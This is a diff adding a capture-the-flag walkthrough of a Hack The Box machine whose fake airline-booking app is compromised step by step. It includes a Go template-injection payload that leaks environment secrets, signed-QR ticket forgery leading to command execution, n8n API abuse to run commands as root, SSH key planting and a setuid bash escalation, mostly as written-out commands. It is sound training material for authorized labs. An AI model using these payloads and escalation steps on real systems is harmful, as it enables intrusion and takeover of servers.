@@ -1,0 +1,193 @@
+Takeoff is a Hard Linux machine built around a realistic airline-booking application called HTB Airways Booking. The application allows users to register accounts, search for flights, select seats, purchase tickets, download boarding passes, and check in using QR codes.
+The external attack surface appeared small because only SSH and HTTP were exposed. However, the web application contained several vulnerabilities that could be combined into a complete attack chain.
+
+The overall attack path was:  Web enumeration
+→ Account registration
+→ Flight booking
+→ PDF ticket SSTI
+→ Environment secret disclosure
+→ Signed QR ticket reconstruction
+→ Command execution as www-data
+→ Internal n8n API access
+→ Container command execution as root
+→ Access to kpark’s mounted home directory
+→ SSH access as kpark
+→ Setuid Bash privilege escalation
+→ Root access
+
+The Hack The Box VPN configuration was downloaded and started through OpenVPN.  sudo openvpn --config machines_us-3.ovpn
+The VPN connection was confirmed by checking the tun0 interface and the route to the target:  ip -br addr show tun0
+ip route get TARGET_IP
+ping -c 3 TARGET_IP 
+A quick Nmap scan showed that only SSH and HTTP were exposed:  sudo nmap -Pn -n --top-ports 20 TARGET_IP
+sudo nmap -Pn -n -p- --min-rate 3000 -T4 TARGET_IP -oA scans/all-ports
+Only the following ports were open:  22/tcp  OpenSSH 80/tcp  nginx
+Service detection identified a modern Debian Linux system, OpenSSH, nginx, and an airline-booking website.  sudo nmap -Pn -n -p22,80 -sC -sV --version-all TARGET_IP -oA scans/services
+The root page was inspected with curl:  curl -i http://TARGET_IP/
+The X-Powered-By header showed that the backend was built with the Go Echo framework.
+A new account was created through the /sign-up endpoint.  curl -i -c web/cookies.txt \
+  -d 'name=LAB_USER&email=LAB_EMAIL&password=LAB_PASSWORD&terms=on' \
+  http://TARGET_IP/sign-up
+The account was then authenticated:  curl -i -c web/cookies.txt -b web/cookies.txt \
+  -d 'email=LAB_EMAIL&password=LAB_PASSWORD' \
+  http://TARGET_IP/sign-in
+A valid search produced available schedules:  curl -b web/cookies.txt \
+  "http://TARGET_IP/search/results?
+origin=HTB&destination=GLW&date=LAB_DATE&pax=1&class=coach"
+The booking was started with:  curl -i -b web/cookies.txt -c web/cookies.txt \
+  -X POST \
+  -d 'schedule_id=SCHEDULE_ID&seat_ids=81' \
+  http://TARGET_IP/book/start
+passenger form requested The information was submitted with:  curl -i -b web/cookies.txt -c web/cookies.txt \
+  -X POST \
+  --data-urlencode 'full_name=LAB_USER' \
+  --data-urlencode 'dob=1990-01-01' \
+  --data-urlencode 'id_type=passport' \
+  --data-urlencode 'id_number=LAB_ID' \
+  http://TARGET_IP/book/BOOKING_PNR/passengers
+The payment page required a previously saved card. A test card was added through /payment-cards.  curl -i -b web/cookies.txt -c web/cookies.txt \
+  -X POST \
+  -d 'next=/book/BOOKING_PNR/payment' \
+  -d 'pan=4242424242424242' \
+  --data-urlencode 'cardholder_name=LAB_USER' \
+  -d 'exp_month=12' \
+  -d 'exp_year=2030' \
+  http://TARGET_IP/payment-cards
+The application returned to the booking payment page, where the newly created card had a numeric ID. Payment was completed with:  curl -i -b web/cookies.txt -c web/cookies.txt \
+  -X POST \
+  -d 'payment_card_id=CARD_ID' \
+  http://TARGET_IP/book/BOOKING_PNR/payment
+A Go template payload was stored in the ticket notes:  {{ .File "/proc/self/environ" }}
+The payload was submitted with:  curl -i -b web/cookies.txt \
+  -X POST \
+  --data-urlencode 'notes={{ .File "/proc/self/environ" }}' \
+  http://TARGET_IP/tickets/BOOKING_PNR/notes
+Exploiting SSTI in PDF Generation The boarding pass was downloaded:  curl -b web/cookies.txt \
+  http://TARGET_IP/tickets/BOOKING_PNR/download \
+  -o loot/ticket.pdf
+The file was confirmed to be a valid PDF: file loot/ticket.pdf
+Text was extracted with Poppler’s pdftotext: pdftotext -raw loot/ticket.pdf loot/ticket.txt
+The disclosed environment included:  USER=www-data
+HOME=/var/www
+TICKET_VALIDATION_TOKEN=[REDACTED]
+N8N_API_KEY=[REDACTED]
+The value was extracted and decoded:  import base64
+import html
+import re
+
+page = open("web/check-in.html", encoding="utf-8").read()
+qr = re.search(r'name="qr_data" value="([^"]+)"', page).group(1)
+raw = base64.b64decode(html.unescape(qr))
+
+open("loot/ticket-qr.bin", "wb").write(raw)
+open("loot/ticket-gob.bin", "wb").write(raw[:-32])
+open("loot/ticket-signature.bin", "wb").write(raw[-32:])
+The leaked ticket-validation token was used to verify the signature:  calculated = hmac.new(
+    validation_key,
+    gob_data,
+    hashlib.sha256
+).digest() 
+
+The ticket was encoded as a Go gob object named:  *gob.VerifyTicketAuthenticity
+The object contained one field:  type VerifyTicketAuthenticity struct {
+    Data []byte
+}
+The Data field held JSON containing:  {
+  "PNR": "BOOKING_PNR",
+  "Token": "BOOKING_TOKEN",
+  "Seat": "1A",
+  "Passenger": "LAB_USER",
+  "NotifyCmd": "check-in-notify ..."
+}
+The generated gob was compared with the legitimate ticket:  cmp -s generated-gob.bin original-gob.bin
+Forging a Signed QR Ticket
+
+A Python script was created to:
+
+Build a JSON ticket object.
+Set a controlled value in NotifyCmd.
+Call the custom Go gob encoder.
+Calculate an HMAC-SHA256 signature.
+Append the signature to the gob data.
+Base64-encode the completed ticket.
+Submit it to /api/check-in.
+The check-in endpoint accepted the correctly signed QR ticket.
+A harmless callback was used first to confirm command execution. After command execution was verified, an interactive shell was obtained in the authorized lab environment.
+The resulting shell ran as:  uid=33(www-data)
+The working directory was the airline application directory:  /opt/htb-airways/booking
+Enumeration from the www-data shell revealed:
+The Go airline application
+nginx
+Docker
+A local MySQL container
+A locally exposed n8n service
+Host users including kpark
+An n8n API key in the airline service environment
+The n8n service was available only through:  127.0.0.1:5678
+The health endpoint confirmed that n8n was running:  curl http://127.0.0.1:5678/healthz
+The n8n API listed existing workflows:  curl \
+  -H "X-N8N-API-KEY: N8N_KEY" \
+  http://127.0.0.1:5678/api/v1/workflows
+A new workflow was created with two nodes:
+A webhook trigger
+An Execute Command node
+The Execute Command node ran inside the n8n container as root.
+The workflow was created through:  POST /api/v1/workflows
+The returned workflow ID was captured and activated:  POST /api/v1/workflows/WORKFLOW_ID/activate
+The webhook was then triggered:  curl http://127.0.0.1:5678/webhook/WORKFLOW_PATH
+The output confirmed:  uid=0(root) gid=0(root)
+The n8n container’s /root directory was not the host’s real /root. Instead, the host directory /home/kpark had been bind-mounted into the container as /root.
+This meant:  Host:      /home/kpark Container: /root
+Files written to /root by the container appeared in /home/kpark on the host.
+The user flag was accessible through this shared directory and was recovered from the active machine. The value is intentionally omitted here:  User flag: [REDACTED]
+A new Ed25519 SSH key pair was generated on the attacker system:  ssh-keygen -t ed25519 -N '' -f /tmp/kpark_key
+The public key was placed into the mounted home directory using the root-running n8n workflow.
+The required structure was:  /root/.ssh/authorized_keys
+Because container /root mapped to host /home/kpark, the host saw:  /home/kpark/.ssh/authorized_keys
+The correct permissions and ownership were applied:  /home/kpark/.ssh  700
+/home/kpark/.ssh/authorized_keys   600
+Owner   UID 1001, GID 1001
+SSH access succeeded:  ssh -i /tmp/kpark_key \
+  -o IdentitiesOnly=yes \
+  -o PreferredAuthentications=publickey \
+  -o PasswordAuthentication=no \
+  kpark@TARGET_IP
+The resulting identity was:  uid=1001(kpark) gid=1001(kpark)
+Privilege Escalation Through the Shared Mount
+As kpark, the host Bash executable was copied into the user’s home directory:  cp /bin/bash /home/kpark/pwnbash
+Because /home/kpark was bind-mounted as /root inside the n8n container, the root-running n8n workflow could modify the same file through:  /root/pwnbash
+The workflow changed its ownership and permissions:  chown root:root /root/pwnbash
+chmod 4755 /root/pwnbash
+Back in the kpark SSH session, the file appeared as:  -rwsr-xr-x 1 root root ... /home/kpark/pwnbash
+The s in the owner execute position confirmed that the setuid bit was enabled.
+The binary was executed with Bash’s privileged-mode option:  /home/kpark/pwnbash -p
+The new shell showed an effective user ID of root:  uid=1001(kpark)
+euid=0(root)
+The root flag was then recovered from:  /root/root.txt 
+The value is intentionally omitted:  Root flag: [REDACTED]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
